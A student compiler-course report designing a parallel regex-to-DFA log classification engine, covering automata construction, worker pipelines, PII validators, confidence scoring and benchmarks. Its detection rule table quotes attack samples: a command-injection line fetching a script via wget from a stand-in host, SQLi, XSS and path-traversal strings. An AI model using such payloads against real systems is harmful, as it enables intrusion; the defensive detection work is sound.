# Research Report — Real-Time Parallel Log / Event Triage Engine

*Compiler Design course project, Team 1. Companion to `base_paper.md` and `review1_submission.md`. Prepared as one of two research inputs (the other from Gemini) to be merged into a final design.*

---

## 0. Recommended design in one paragraph

Build the pattern engine as a small **regex compiler**: parse every log-classification rule (regex → AST via a recursive-descent parser), convert each to an NFA with **Thompson's construction**, union them, and determinize with **subset construction** into a single **combined multi-pattern DFA** whose accepting states carry a bitmask of which rules matched. Each log line is then classified in **one linear-time pass**, regardless of how many rules exist. Parallelize by **data, not by pattern**: a reader thread splits the stream into batches of lines, a dispatcher hands batches to a **persistent pool of worker threads** (pinned to cores) over bounded ring buffers, every worker runs the same read-only DFA, and an aggregator applies validators (Luhn, Verhoeff), **multi-label conflict resolution**, **evidence-based confidence**, **windowed correlation** (e.g. brute-force detection), and routing. Use POSIX `regex.h` as the correctness oracle and the sequential/per-pattern baseline. This keeps the base paper's three-layer structure but fixes its core performance flaw (fork per input) and makes the project genuinely about compiler techniques.

---

## A. Compiler-design foundations

### A.1 Why this is a compiler project

Regex matching is exactly the lexical-analysis phase of a compiler. The pipeline we would build mirrors compiler phases:

| Compiler phase | Our equivalent |
|---|---|
| Lexing the source | Tokenizing regex syntax in `patterns.conf` |
| Parsing (grammar → AST) | Recursive-descent parser for the regex grammar (alternation < concatenation < repetition < atom) |
| Intermediate representation | Thompson NFA |
| Optimization | Subset construction (NFA → DFA), DFA minimization (Moore/Hopcroft), state-count reduction |
| Code generation | Transition table `int next[state][256]` + `uint64_t accept_mask[state]` (or emitted C `switch` code) |
| Runtime | Workers executing the DFA over log lines |

This is the same thing lex/flex/re2c do when they combine many token rules into one DFA — the difference is that our "tokens" are log categories and we need *all* matching rules (multi-label), not just the longest one.

### A.2 Engine options

| Option | What it is | Pros | Cons | Verdict |
|---|---|---|---|---|
| **POSIX `regex.h`** (glibc `regcomp`/`regexec`) | What the base paper uses; one `regexec` per rule per line | Zero effort, POSIX standard | Cost grows linearly with rule count; glibc's `regexec` takes an internal lock, so threads sharing one `regex_t` contend (glibc bug 11159; rsyslog works around it by compiling a separate `regex_t` per thread) | **Baseline + correctness oracle** |
| **Own regex → NFA → DFA compiler** | Thompson + subset construction, combined DFA with accept bitmasks | Shows compiler concepts directly; one pass per line independent of rule count; linear-time, no ReDoS; read-only tables shareable across threads without locks | ~600–1000 lines of C; must handle DFA state blow-up | **Recommended core contribution** |
| **re2c** | Lexer generator: compiles regex specs to DFA and emits direct-coded C; can dump NFA/DFA stages as Graphviz DOT; offers Moore and table-filling DFA minimization | Very fast generated code; DOT dumps are great for the report | Build-time only (rules can't change at runtime); less "we built it" | **Optional comparison / visual aid** |
| **Hyperscan / Vectorscan** | Intel's SIMD multi-pattern matcher (NSDI '19): decomposes regexes into literal + automaton parts and SIMD-accelerates both; reported 8.7× Snort speedup on real traffic | Industrial ceiling; good related work | Hyperscan went proprietary after 5.4; Vectorscan is the BSD fork. Heavy dependency, hides the compiler part | **Related work; stretch benchmark only** |

### A.3 Why DFA instead of backtracking

Russ Cox's well-known article "Regular Expression Matching Can Be Simple And Fast" shows that backtracking engines (Perl, PCRE, Python, Java) can go exponential on patterns such as `(a?)^n a^n`, while Thompson-style NFA simulation is linear for every input. Exponential behavior on attacker-controlled input is called **ReDoS**. For a security log engine that processes attacker-supplied strings (URLs, user agents), a linear-time guarantee is a real, citable design argument, not just a speed claim.

Our regex subset deliberately supports only *regular* constructs: literals, `.`, character classes `[a-z]`/`[^...]`, `* + ?`, `{m,n}` (expanded during construction), `|`, grouping, `^`/`$` anchors, and a per-rule case-insensitive flag. No backreferences or lookaround — by design, because those are what make matching non-regular.

### A.4 Combined multi-pattern DFA — key details

- **Unanchored search:** build the DFA for `Σ*(r1 | r2 | ... | rk)` so a match can start anywhere. While scanning, OR together the `accept_mask` of every state visited; the final mask tells which rules matched somewhere in the line. `$`-anchored rules are only counted at end-of-line.
- **Accept masks:** with ≤ 64 rules, a `uint64_t` per state is enough. Rule IDs map to categories in the config.
- **State explosion risk:** subset construction can produce exponentially many states in theory, and unions of many unanchored patterns are the classic trigger. Mitigations, in increasing effort: (1) cap state count and report it as a metric; (2) split rules into 2–4 groups (one DFA each) — this is a natural pattern-parallel experiment; (3) **lazy DFA** — build DFA states on demand and cache them, which is the approach RE2 takes on top of Thompson NFA simulation.
- **Correctness:** **differential testing** — for every line in the corpus, compare the per-rule match bitmask from our DFA against running each rule through `regex.h`. Any mismatch is a bug. This is cheap and very convincing in a report.
- **Report visuals:** dump the NFA/DFA for a small rule set to Graphviz DOT and include the diagrams.

### A.5 Related compiler/automata work for the literature section

- **Thompson's construction / subset construction / DFA minimization** — standard (Aho, Lam, Sethi, Ullman, "Compilers: Principles, Techniques, and Tools", ch. 3).
- **Mytkowicz, Musuvathi, Schulte — "Data-Parallel Finite-State Machines" (ASPLOS 2014):** parallelizes a *single* FSM run by enumerating transitions from all possible start states, reaching up to 3× on one core (SIMD) and linear speedups up to 21× on 8 cores across regex, Huffman decoding, and HTML tokenization. Relevant as the alternative to our design: it splits one long input across cores, whereas logs are naturally line-separated, so line-level data parallelism is simpler and sufficient.

---

## B. Parallel / streaming architecture

### B.1 Data parallelism vs pattern parallelism

| | Pattern parallelism (base paper) | Data parallelism (recommended) |
|---|---|---|
| Split | Each worker owns one category; every line goes to every worker | Each worker gets different lines; runs all rules |
| Per-line coordination | Broadcast + wait for all N workers + merge (barrier per line) | None until aggregation |
| Scales with | Number of categories (capped at ~5–10) | Number of lines (effectively unbounded) |
| With a combined DFA | Pointless — all rules are already one pass | Natural fit |

Per-line work in log classification is microseconds, so per-line synchronization dominates. Pattern parallelism only makes sense for very expensive rules; we can still demonstrate it as a comparison experiment (split rules into groups, one DFA per worker).

### B.2 Worker model

- **Persistent pool**, created once at startup, after rules are compiled. Never fork per input.
- **pthreads recommended**: the compiled DFA is read-only, so all workers share it with no locks. Pin each worker with `pthread_setaffinity_np` (keeps the base paper's core-affinity idea).
- **If the professor expects process-level parallelism** (as in the base paper): compile first, then `fork()` workers — copy-on-write shares the DFA tables — and use shared-memory ring buffers (`shm_open` + `mmap`). Same design, different plumbing.
- **If using `regex.h` in threads** (baseline): give each thread its own compiled `regex_t` to avoid glibc's internal lock contention.

### B.3 Queues, batching, backpressure

- **Batching:** move lines in batches (try 64 → 4096 lines) to amortize queue operations. Logstash exposes the same knobs: `pipeline.workers`, `pipeline.batch.size`, and `pipeline.batch.delay`, and notes that in-flight events = workers × batch size. A batch size sweep is a clean experiment.
- **Batch timeout:** flush a partial batch after a few milliseconds so latency stays bounded at low input rates (Logstash's `batch.delay` idea).
- **Queues:** one bounded single-producer/single-consumer ring per worker (dispatcher → worker) and one back to the aggregator. SPSC rings need only atomic head/tail indices (C11 `stdatomic.h`), no mutex. A mutex + condition-variable queue is acceptable as a first version.
- **Backpressure:** queues are bounded; when full, the reader blocks (no data loss). Optionally a drop mode that counts dropped lines, to demonstrate overload behavior.
- **Dispatch policy:** round-robin is the baseline; least-loaded (pick the worker with the shortest queue) is an easy improvement and a direct answer to the base paper's "dynamic load balancing" claim, which it never demonstrated.
- **Ordering:** every line gets a sequence number at ingest. If ordered output is required, the aggregator keeps a small reorder buffer; otherwise emit as completed.

### B.4 Module breakdown and data flow

```
stdin / file / tail -F
        │
   [Reader]  – read buffered input, split lines, assign seq numbers,
        │      normalize (URL-decode %xx, strip control chars), build batches
        ▼
 [Dispatcher] – round-robin / least-loaded → per-worker SPSC ring
        │
   ┌────┼────┐
   ▼    ▼    ▼
[Worker 0..N-1] – run combined DFA → rule bitmask; run validators on
   │    │    │     candidate spans (Luhn, Verhoeff); emit MatchResult
   └────┼────┘
        ▼
 [Aggregator/Scorer] – map rules → categories, multi-label resolution,
        │              severity, confidence
        ▼
 [Correlator] – sliding-window counters keyed by IP/user (brute force,
        │       failure-then-success escalation)
        ▼
   [Router] – alerts.log / pii_quarantine.log (masked) / store.jsonl / stats
```

Core data structures:

```c
typedef struct {            // produced by Reader
    uint64_t seq_start;
    uint32_t count;
    uint32_t offsets[BATCH_MAX + 1];  // line i = buf[offsets[i] .. offsets[i+1])
    char    *buf;
} Batch;

typedef struct {            // produced by Worker, one per line
    uint64_t seq;
    uint64_t rule_mask;       // bit r set ⇒ rule r matched
    uint64_t validated_mask;  // rules whose validator passed
    uint32_t line_off, line_len;
} MatchResult;

typedef struct {            // output record (JSON line)
    uint64_t seq;
    int      primary_category, severity;
    float    confidence;
    uint32_t label_mask;      // all categories, multi-label
} Classified;

typedef struct {            // compiled pattern engine (read-only after build)
    int       nstates;
    int32_t  *next;           // nstates * 256
    uint64_t *accept_mask;    // per state
    uint64_t *accept_at_end;  // for $-anchored rules
} DFA;
```

Rule config (`patterns.conf`), one rule per line:

```
# id            category         severity  flags  regex
SSH_FAIL_PW     AUTH_FAILURE     MEDIUM    -      Failed password for (invalid user )?[^ ]+ from [0-9.]+
SQLI_UNION      SECURITY_THREAT  HIGH      i      union[ +]+(all[ +]+)?select
PII_AADHAAR     PII              HIGH      v:verhoeff  (^|[^0-9])[2-9][0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}([^0-9]|$)
```

---

## C. Classification content

### C.1 Pattern table

Written in POSIX-ERE-compatible syntax (`[0-9]` not `\d`; no `\b` — use explicit non-word boundaries) so the same rules run in both our DFA and `regex.h`. Flag `i` = case-insensitive. These are starting points to tune against the datasets in section E.

| Category | Rule | Example line | Regex | Severity |
|---|---|---|---|---|
| AUTH_FAILURE | SSH failed password | `sshd[24200]: Failed password for invalid user webmaster from 173.234.31.186 port 38926 ssh2` | `Failed password for (invalid user )?[^ ]+ from [0-9.]+` | MEDIUM |
| AUTH_FAILURE | SSH invalid user | `sshd[24206]: Invalid user test9 from 52.80.34.196` | `Invalid user [^ ]* from [0-9.]+` | MEDIUM |
| AUTH_FAILURE | PAM failure | `pam_unix(sshd:auth): authentication failure; ... rhost=...` | `pam_unix\([a-z-]+:auth\): authentication failure` | MEDIUM |
| AUTH_FAILURE | sudo wrong password | `sudo: alice : 3 incorrect password attempts` | `incorrect password attempts?` | MEDIUM |
| AUTH_FAILURE | HTTP 401/403 | `"POST /login HTTP/1.1" 401 512` | `" (401\|403) [0-9-]+` | LOW |
| SECURITY_THREAT | SQLi (union/tautology/sleep) | `GET /item?id=1+UNION+SELECT+password+FROM+users` | `(union[ +]+(all[ +]+)?select\|or[ +]+1=1\|sleep\([0-9]+\)\|benchmark\(\|information_schema)` (i) | HIGH |
| SECURITY_THREAT | XSS | `GET /search?q=<script>alert(1)</script>` | `(<script\|javascript:\|onerror=\|onload=)` (i) | HIGH |
| SECURITY_THREAT | Path traversal / LFI | `GET /../../etc/passwd` | `(\.\./\|\.\.\\\|/etc/passwd\|/etc/shadow)` | HIGH |
| SECURITY_THREAT | Command injection | `GET /ping?host=1.1.1.1;wget http://x/s.sh` | `(;\|\|\|\|&&\|\$\()[ +]*(wget\|curl\|nc\|bash\|sh)[ +/]` (i) | CRITICAL |
| SECURITY_THREAT | Scanner user-agent | `"sqlmap/1.7#stable"` | `(sqlmap\|nikto\|nmap\|masscan\|gobuster\|dirbuster)` (i) | MEDIUM |
| ERROR | Level token | `2026-10-01 12:00:01 ERROR db: connection refused` | `(^\|[^A-Za-z])(ERROR\|FATAL\|CRITICAL\|SEVERE)([^A-Za-z]\|$)` | MEDIUM |
| ERROR | Java stack trace | `\tat com.app.Service.run(Service.java:42)` | `^[ \t]+at [A-Za-z0-9_.$]+\(` | MEDIUM |
| ERROR | HTTP 5xx | `"GET /api HTTP/1.1" 503 0` | `" 5[0-9][0-9] [0-9-]+` | MEDIUM |
| ERROR | Crash / OOM kill | `kernel: Out of memory: Killed process 1234 (java)` | `(segfault at\|Kernel panic\|Out of memory: Killed process\|oom-killer)` | HIGH |
| PERF_WARNING | Slow query | `# Query_time: 12.5  Lock_time: 0.0` | `(slow query\|Query_time: [0-9]+)` (i) | LOW |
| PERF_WARNING | Timeout | `upstream timed out (110: Connection timed out)` | `(timed out\|timeout\|deadline exceeded)` (i) | MEDIUM |
| PERF_WARNING | High latency field | `request completed duration=2345ms` | `(took\|duration\|elapsed)[=: ]+[0-9]{4,}(\.[0-9]+)? ?ms` | LOW |
| PERF_WARNING | Resource pressure | `disk usage 97% on /var` | `(connection pool exhausted\|queue (is )?full\|disk usage 9[0-9]%\|high (cpu\|memory) usage)` (i) | MEDIUM |
| PII | Email | `user=john@example.com logged in` | `[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}` | LOW |
| PII | Card number (+Luhn) | `card=4111 1111 1111 1111` | `(^\|[^0-9])[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{1,4}([^0-9]\|$)` | CRITICAL |
| PII | Aadhaar (+Verhoeff) | `aadhaar: 2341 2345 6783` | `(^\|[^0-9])[2-9][0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}([^0-9]\|$)` | HIGH |
| PII | PAN | `pan=ABCPE1234F` | `[A-Z]{3}[ABCFGHJLPT][A-Z][0-9]{4}[A-Z]` | HIGH |
| PII | Indian mobile | `phone=+91 9876543210` | `(^\|[^0-9])(\+91[ -]?)?[6-9][0-9]{9}([^0-9]\|$)` | MEDIUM |
| PII | Secret in query string | `GET /login?user=a&password=hunter2` | `(password\|passwd\|pwd\|token\|api_key\|secret)=[^& "]+` (i) | CRITICAL |

Notes on the PII rules:
- **Aadhaar:** 12 digits, never starting with 0 or 1, last digit is a Verhoeff check digit that catches single-digit typos and adjacent swaps. The regex alone will flag many unrelated 12-digit IDs; the Verhoeff validator removes most of them.
- **PAN:** 10 characters, 5 letters + 4 digits + 1 letter; the 4th letter encodes holder type (P individual, C company, H HUF, F firm, A AOP, T trust, B BOI, L local authority, J artificial juridical person, G government).
- **Cards:** always run Luhn after the regex; regex alone will match timestamps and order IDs.
- **Masking for routing:** quarantine output should redact the value, e.g. Aadhaar shown as `XXXX XXXX 6783` (MeitY-style masking of the first 8 digits; python-stdnum implements exactly this).
- **Digit boundaries** (`(^|[^0-9])...([^0-9]|$)`) are essential — without them, a 16-digit card regex matches inside longer numbers.
- **URL-decode before matching** (`%20`, `%3C`, `+`): attacks in access logs are usually encoded. This is the streaming version of the base paper's "input normalization" module and actually matters here. Keep the original line for output.

### C.2 Stateful detection (what regex alone can't do)

| Rule | Logic | Grounding |
|---|---|---|
| SSH brute force | ≥ `maxretry` AUTH_FAILURE events from the same source IP within `findtime` seconds → escalate to SECURITY_THREAT / HIGH | fail2ban's model: a filter regex matching `maxretry` times within `findtime` triggers an action (defaults commonly around 5 attempts / 600 s) |
| Password spraying | Failures from one IP against ≥ K distinct usernames in T seconds | Elastic's SSH password-spraying detection rule |
| Failure-then-success | Burst of failures from an IP followed by a successful login from the same IP → CRITICAL | Sigma correlation docs call this out as a likely successful attack worth higher priority |
| Error storm | ≥ N ERROR lines from one component within T seconds → single aggregated alert | Alert de-duplication |

Implementation: the correlator keeps a hash map `key → ring of timestamps` (or a fixed bucket counter per second). To keep it lock-free, run it single-threaded after aggregation, or shard by `hash(ip) % shards` so the same IP always lands on the same shard. Sigma's correlation rules (`event_count` with a timespan, grouped by a field) are the standard vocabulary for describing this in the report.

### C.3 Severity → routing

| Severity | Route |
|---|---|
| CRITICAL / HIGH | `alerts.log` + highlighted on stderr (the "alert" sink) |
| PII (any) | `pii_quarantine.log` with masked values |
| MEDIUM | Counters on a live stats line / dashboard |
| LOW / INFO / no match | `store.jsonl` (archive) |

---

## D. Conflict resolution and confidence

### D.1 Multi-label, not single winner

A log line can be several things at once: `Failed password for root from 1.2.3.4` arriving as the 40th failure in a minute is both AUTH_FAILURE and (after correlation) SECURITY_THREAT; an access-log line can contain SQLi *and* an email. The base paper forces one winner using arbitrary 0.4/0.3/0.3 weights. Instead:

1. Keep **all** categories whose confidence ≥ τ (e.g. 0.5) as labels.
2. **Primary label** = highest severity among them; ties broken by confidence, then a fixed category priority (SECURITY_THREAT > PII > AUTH_FAILURE > ERROR > PERF_WARNING).
3. Routing uses the primary label, but the output record keeps all labels.

This matches how WAFs work: OWASP CRS assigns each rule a severity and the engine sums the severities of all firing rules into an anomaly score, blocking above a threshold. That is a well-known, citable alternative to "pick one".

### D.2 Explainable confidence

Evidence-tier model, modeled on Microsoft Purview's sensitive-information types: Purview's Aadhaar detector reports *high* confidence when the pattern matches, the checksum passes, and a keyword like "aadhaar" appears nearby, and *medium* confidence with pattern + checksum alone.

Per firing rule *r*:

- `s = base(r)` — rule's prior precision tier (e.g. strong 0.6, weak 0.35), set in config.
- `+0.25` if the rule's validator passes (Luhn / Verhoeff); if a validator exists and **fails**, discard the match.
- `+0.15` if a context keyword for the category appears in the line (e.g. `card`, `aadhaar`, `pan`, `password`).
- Clamp to [0, 1].

Per category, combine independent firing rules with **noisy-OR**: `conf(c) = 1 − Π(1 − s_i)`. Correlation escalations (brute force threshold reached) set the escalated category to a fixed high value (e.g. 0.95).

Every number in this model is inspectable ("PII 0.85 = pattern 0.6 + Verhoeff 0.25"), which is easy to defend in a viva.

### D.3 Validating it (calibration)

On the labeled set, bucket predictions by confidence (0–0.1, …, 0.9–1.0) and plot actual precision per bucket (a reliability diagram). If the 0.8–0.9 bucket is only 60% correct, lower the base weights. This directly tests the base paper's unverified claim that high-confidence predictions are 99.2% accurate.

---

## E. Evaluation methodology

### E.1 Datasets

| Dataset | Content | Labels | Use for |
|---|---|---|---|
| Loghub **OpenSSH** | 655,146 lines over 28.4 days (~70 MB) | None | AUTH_FAILURE rules, brute-force correlation, throughput on real lines |
| Loghub **Apache** (error log) | 56,481 lines | None | ERROR rules |
| Loghub **Linux** | 25,567 lines | None | Mixed system events (auth, kernel) |
| Loghub **BGL** | 4,747,963 lines, Blue Gene/L supercomputer | Alert vs non-alert per message | ERROR-category precision/recall; large-volume throughput |
| **AIT-LDS v2.0** (Zenodo) | Synthetic multi-host enterprise testbed: Apache access/error, auth, DNS, VPN, audit, Suricata, syslog | Line-level attack labels in JSON (line number + labels) | **Security-category ground truth** — the best match for our attack/auth categories |
| **Synthetic generator** (we write it) | Mix of benign templates + injected attacks, PII (with valid/invalid checksums), errors, at a controlled rate | Exact, by construction | PII accuracy, validator effect, latency vs input rate |

Cite Loghub (Zhu et al., ISSRE 2023) and AIT-LDS (Landauer et al.) if used. Loghub is free for research/academic use.

For categories without labels (PERF_WARNING, most PII in real data), hand-label a stratified sample (e.g. 500–1000 lines) — both teammates label independently and report agreement.

### E.2 Experiments

| # | Experiment | Varies | Measures | Expected shape (hypothesis, not a result) |
|---|---|---|---|---|
| E1 | Scaling | Workers 1 → #cores | Throughput (lines/s), speedup, efficiency | Near-linear until reader/aggregator becomes the serial bottleneck (Amdahl) |
| E2 | Batch size | 1, 16, 64, 256, 1024, 4096 | Throughput, p99 latency | Throughput rises then plateaus; latency rises with batch size |
| E3 | **Engine vs rule count** | 5 → 50 rules | Throughput | `regex.h` loop drops ~linearly with rule count; combined DFA stays roughly flat — the headline compiler result |
| E4 | Base paper vs ours | fork-per-line (base design) vs worker pool | Throughput | Orders-of-magnitude gap, explained by process creation cost |
| E5 | Latency under load | Input rate (lines/s) from generator | p50/p95/p99 end-to-end latency | Flat until saturation, then queueing delay climbs |
| E6 | Accuracy | — | Precision / recall / F1 per category, with and without validators | Validators raise PII precision substantially |
| E7 | Load balancing | Round-robin vs least-loaded, skewed line lengths | Per-worker utilization variance | Least-loaded reduces variance |
| E8 *(stretch)* | ReDoS | Pathological pattern + crafted input on a backtracking engine (PCRE2) vs our DFA | Time vs input length | Backtracking exponential, DFA linear |
| E9 *(stretch)* | DFA size | Rule set size, grouping | DFA state count, memory, build time | Shows state-explosion trade-off and the value of grouping/minimization |

Report the machine (CPU model, cores, RAM, kernel, gcc version and flags), run each benchmark several times, and report median and spread. Never quote a single run.

### E.3 Tools

`perf stat` / `perf record` (cycles, cache misses), `hyperfine` (repeatable timing of whole runs), `valgrind --tool=callgrind` (hotspots), `valgrind --tool=helgrind` or `-fsanitize=thread` (data races in the pipeline), `taskset` (pinning experiments), `clock_gettime(CLOCK_MONOTONIC)` for per-line latency, Python + matplotlib for plots.

---

## F. Related work (verified)

1. **Wang et al., "Hyperscan: A Fast Multi-pattern Regex Matcher for Modern CPUs," USENIX NSDI 2019.** Regex decomposition into literal and FA components plus SIMD matching; prefiltering with fast literal matching. Borrow: the prefilter idea (cheap literal check before full regex) and the framing that multi-pattern matching is the bottleneck in security tools.
2. **Mytkowicz, Musuvathi, Schulte, "Data-Parallel Finite-State Machines," ASPLOS 2014.** Parallelizing a single FSM run via enumeration. Borrow: related-work contrast for why line-level parallelism suffices for logs.
3. **Russ Cox, "Regular Expression Matching Can Be Simple And Fast," 2007 (swtch.com).** Thompson NFA vs backtracking; linear-time guarantee. Borrow: the ReDoS argument and a clean Thompson implementation to follow.
4. **He, Zhu, Zheng, Lyu, "Drain: An Online Log Parsing Approach with Fixed Depth Tree," ICWS 2017.** Streaming log template extraction using a fixed-depth tree; regex preprocessing masks variables first. Borrow: optional template ID per line; the idea that regex preprocessing precedes structure mining.
5. **Zhu et al., "Loghub: A Large Collection of System Log Datasets for AI-driven Log Analytics," ISSRE 2023.** Dataset source.
6. **Landauer et al., AIT Log Data Sets (AIT-LDS v2.0), Zenodo.** Labeled multi-host attack logs.
7. **OWASP Core Rule Set (CRS).** Regex rules for SQLi (942xxx), XSS (941xxx), RCE (932xxx) with severities and anomaly scoring. Borrow: pattern ideas and the severity-sum model. (Don't copy rules verbatim — they're long and PCRE-specific; derive simplified ERE versions and cite.)
8. **SigmaHQ Sigma rules + Sigma correlation spec.** Vendor-neutral detection rules, including `event_count`-over-timespan correlations. Borrow: vocabulary and structure for stateful rules.
9. **fail2ban.** Regex filters over log files + `maxretry`/`findtime` thresholds. Borrow: the simplest real-world precedent for regex + windowed counting.
10. **re2c (Bumbulis & Cowan 1994; Trofimovich 2020).** Regex-to-DFA lexer generator with DOT dumps and DFA minimization. Borrow: comparison point; visualization.

---

## G. Base-paper weaknesses → our contributions

| Base paper | Our extension |
|---|---|
| `fork()` one process per pattern **per input** | Persistent worker pool created once |
| `regcomp`/`regfree` on every match | Compile rules once at startup |
| Pattern parallelism with a barrier per input | Data parallelism with batching; pattern-parallel kept only as a comparison |
| N separate regex passes per input | Single-pass combined DFA built with Thompson + subset construction |
| No discussion of ReDoS / worst-case time | Linear-time guarantee by construction |
| Single-label "winner" with arbitrary 0.4/0.3/0.3 weights | Multi-label output, severity-based primary, evidence-based noisy-OR confidence |
| Confidence accuracy claimed, not shown | Calibration plot on labeled data |
| Normalization lowercases everything, breaking the NAME regex; screenshots show normalization not actually applied | Per-rule case-insensitivity flag; normalization limited to URL-decoding/control chars |
| Stateless only | Windowed correlation (brute force, spraying, failure-then-success) |
| No validators | Luhn and Verhoeff post-match validation |
| "Dynamic load balancing" claimed, not shown | Round-robin vs least-loaded measured (E7) |
| Inconsistent numbers, no reproducible setup | Public datasets, scripted benchmarks, median of repeated runs |

---

## H. Roadmap (2 people, ~5 weeks — adjust to actual deadlines)

Split: **Person A = pattern compiler**, **Person B = runtime pipeline + evaluation**.

| Week | Person A (compiler) | Person B (runtime/eval) |
|---|---|---|
| 1 | `patterns.conf` format; regex lexer + recursive-descent parser → AST | Sequential baseline using `regex.h` (all rules, one thread); synthetic log generator; download OpenSSH/Apache/BGL |
| 2 | Thompson NFA; subset construction → combined DFA with accept masks; DOT dump | Reader (line splitting, URL-decode, seq numbers); batch structure; timing harness |
| 3 | Differential testing vs `regex.h` on full corpus; fix bugs; state-count reporting | Worker pool, ring buffers, dispatcher, aggregator, router; core pinning |
| 4 | Validators (Luhn, Verhoeff, PAN); case-insensitive flag; integrate DFA into workers | Confidence model, multi-label resolution, correlator (brute force); hand-label sample |
| 5 | DFA minimization if time; grouping experiment (E9) | Run E1–E7, plots, report write-up together |

**Must have:** own regex → NFA → DFA compiler for the supported subset; combined multi-rule DFA; differential test against `regex.h`; worker pool with batching; multi-label + confidence; brute-force correlation; routing to files; experiments E1, E3, E4, E6.

**Stretch:** DFA minimization (Hopcroft/Moore); lazy DFA; least-loaded dispatch (E7); latency experiment (E5); ReDoS demo (E8); Vectorscan or re2c comparison; ordered output with reorder buffer; process-based variant with shared memory; small live dashboard (ncurses or a stats line).

**Overkill for this project — skip:** SIMD matching, GPU acceleration, ML classifiers, distributed (multi-machine) processing, Kafka/real SIEM integration.

---

## References / links

- Hyperscan NSDI '19 paper: https://www.usenix.org/conference/nsdi19/presentation/wang-xiang
- Vectorscan (BSD fork of Hyperscan 5.4): https://github.com/VectorCamp/vectorscan
- Hyperscan license change (Phoronix): https://www.phoronix.com/news/Intel-Hyperscan-Now-Proprietary
- Data-Parallel Finite-State Machines (ASPLOS '14): https://www.microsoft.com/en-us/research/publication/data-parallel-finite-state-machines/
- Russ Cox, Regular Expression Matching Can Be Simple And Fast: https://swtch.com/~rsc/regexp/regexp1.html
- re2c: https://re2c.org/
- glibc regexec lock contention (bug 11159): https://sourceware.org/ml/glibc-bugs/2010-01/msg00029.html
- rsyslog per-thread regex workaround: https://git.stg.centos.org/source-git/rsyslog/blob/c8/f/runtime/regexp.c
- Loghub: https://github.com/logpai/loghub — paper: https://arxiv.org/abs/2008.06448
- AIT Log Data Set v2.0: https://zenodo.org/records/5789064
- Drain (logparser docs): https://logparser.readthedocs.io/en/latest/tools/Drain.html
- OWASP CRS rule inventory: https://www.netnea.com/cms/core-rule-set-inventory/
- CRS severity/anomaly scoring (ModSec-AdvLearn paper): https://arxiv.org/pdf/2308.04964
- Sigma correlations: https://sigmahq.io/docs/meta/correlations.html
- Elastic SSH password spraying rule: https://www.elastic.co/guide/en/security/8.19/potential-password-spraying-attack-via-ssh.html
- fail2ban model overview: https://stackharbor.com/en/knowledge-base/fail2ban-deep-configuration/
- Logstash tuning (workers, batch size, delay): https://www.elastic.co/docs/reference/logstash/tuning-logstash
- Microsoft Purview Aadhaar detector (confidence tiers): https://learn.microsoft.com/en-CA/purview/sit-defn-india-unique-identification-number
- python-stdnum Aadhaar (format, Verhoeff, masking): https://arthurdejong.org/python-stdnum/doc/stdnum.in_.aadhaar
